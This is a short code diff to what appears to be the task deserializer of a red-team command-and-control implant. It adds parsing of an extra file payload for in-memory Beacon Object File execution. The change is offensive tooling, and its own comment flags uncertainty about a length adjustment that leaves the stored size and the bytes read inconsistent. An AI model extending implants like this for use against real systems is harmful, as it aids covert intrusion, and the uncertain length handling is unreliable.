@@ -546,9 +546,12 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
         LPCWSTR param2_wstring = 0;
         UINT32 param1_uint32 = 0;
         UINT32 param2_uint32 = 0;
+        UINT32 param3_uint32 = 0; 
+    
 
         LPVOID param1_lpvoid;
         LPVOID param2_lpvoid;
+        LPVOID param3_lpvoid;   
 
 #ifdef INCLUDE_CMD_LS
         CMD_LS *ls;
@@ -1172,6 +1175,18 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
                 param2_lpvoid = ReadBytes(&buffer, param2_uint32);
             }
 
+            tlv_type = ReadUint8(&buffer);
+
+            if (tlv_type == TLV_CMD_EXECUTE_BOF_FILE) { 
+                param3_uint32 = ReadUint32(&buffer);
+                if (param3_uint32 > 0) {
+                    param3_lpvoid = ReadBytes(&buffer, param3_uint32 - 1); // Escape from the null byte in the end. Not sure if it is needed. 
+                }
+                else {
+                    param3_lpvoid = NULL;
+                }   
+            }
+
             task.cmd_id = CMD_EXECUTE_BOF_MESSAGE;
             task.cmd = (CMD_EXECUTE_BOF *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXECUTE_BOF), MEM_COMMIT, PAGE_READWRITE);
             if (!task.cmd) {
@@ -1183,6 +1198,8 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             bof->argc = param1_uint32;
             bof->bof = param2_lpvoid;
             bof->bof_size = param2_uint32;
+            bof->file_content = param3_lpvoid;
+            bof->file_size = param3_uint32;
             
             task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);
             
